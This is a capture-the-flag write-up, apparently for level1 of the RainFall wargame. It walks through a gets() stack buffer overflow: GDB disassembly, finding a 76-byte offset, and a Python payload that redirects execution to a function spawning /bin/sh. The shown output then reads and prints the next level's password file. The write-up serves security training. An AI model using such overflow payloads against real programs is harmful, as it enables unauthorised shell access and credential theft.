# level1

## exploring the binary
```shell
level1@RainFall:~$ ./level1

level1@RainFall:~$ ./level1
phantom
```
After execution, the program waits for input and then terminates.

## GDB analysis
```shell
Dump of assembler code for function main:
   0x08048480 <+0>:	push   %ebp
   0x08048481 <+1>:	mov    %esp,%ebp
   0x08048483 <+3>:	and    $0xfffffff0,%esp
   0x08048486 <+6>:	sub    $0x50,%esp
   0x08048489 <+9>:	lea    0x10(%esp),%eax
   0x0804848d <+13>:	mov    %eax,(%esp)
   0x08048490 <+16>:	call   0x8048340 <gets@plt>
   0x08048495 <+21>:	leave
   0x08048496 <+22>:	ret
End of assembler dump.
```
The main functions calls <code>gets()</code> functions which reads the input. No other functions are called, so we explore out options.
```shell
All defined functions:

Non-debugging symbols:
0x080482f8  _init
0x08048340  gets
0x08048340  gets@plt
0x08048350  fwrite
0x08048350  fwrite@plt
0x08048360  system
0x08048360  system@plt
0x08048370  __gmon_start__
0x08048370  __gmon_start__@plt
0x08048380  __libc_start_main
0x08048380  __libc_start_main@plt
0x08048390  _start
0x080483c0  __do_global_dtors_aux
0x08048420  frame_dummy
0x08048444  run
0x08048480  main
0x080484a0  __libc_csu_init
0x08048510  __libc_csu_fini
0x08048512  __i686.get_pc_thunk.bx
0x08048520  __do_global_ctors_aux
0x0804854c  _fini
```
There is a function <code>run()</code> which could potentially be our way to level2.
```shell
Dump of assembler code for function run:
   0x08048444 <+0>:	push   %ebp
   0x08048445 <+1>:	mov    %esp,%ebp
   0x08048447 <+3>:	sub    $0x18,%esp
   0x0804844a <+6>:	mov    0x80497c0,%eax
   0x0804844f <+11>:	mov    %eax,%edx
   0x08048451 <+13>:	mov    $0x8048570,%eax
   0x08048456 <+18>:	mov    %edx,0xc(%esp)
   0x0804845a <+22>:	movl   $0x13,0x8(%esp)
   0x08048462 <+30>:	movl   $0x1,0x4(%esp)
   0x0804846a <+38>:	mov    %eax,(%esp)
   0x0804846d <+41>:	call   0x8048350 <fwrite@plt>
   0x08048472 <+46>:	movl   $0x8048584,(%esp)
   0x08048479 <+53>:	call   0x8048360 <system@plt>
   0x0804847e <+58>:	leave
   0x0804847f <+59>:	ret
End of assembler dump.
```
Call to <code>system()</code> supports this theory. We can use the common buffer overflow exploit to access the <code>run()</code> function and trigger the <code>/bin/sh</code> of level2.

## buffer overrun attack
To find the offset, we can use an online tool ([Wiremask](https://wiremask.eu/tools/buffer-overflow-pattern-generator/)).
``` shell
level1@RainFall:~$ echo "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa...Ag2Ag3Ag4Ag5Ag" > /tmp/pattern
level1@RainFall:~$ gdb ./level1
(gdb) run < /tmp/pattern
Starting program: /home/user/level1/level1 < /tmp/pattern
```
This way, we find out that <u>the offset is 76</u>. By replacing the return address value with the memory address of the <code>run()</code> function, we can manipulate the program flow to ensure its execution.
``` shell
(gdb) p run
$1 = {<text variable, no debug info>} 0x8048444 <run>
```
To ensure that the memory address is represented correctly in the payload, we need to use the little-endian format:
``` shell
\x44\x84\x04\x08
```
When using Python, we can achieve the same result by reversing the order of the bytes:
``` shell
\x08\x04\x84\x44[::-1]
```

## exploit
``` shell
level1@RainFall:~$ python -c 'print "F" * 76 + "\x08\x04\x84\x44"[::-1]' > /tmp/flag1
level1@RainFall:~$ cat /tmp/flag1 - | ./level1
Good... Wait what?
whoami
level2
cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```
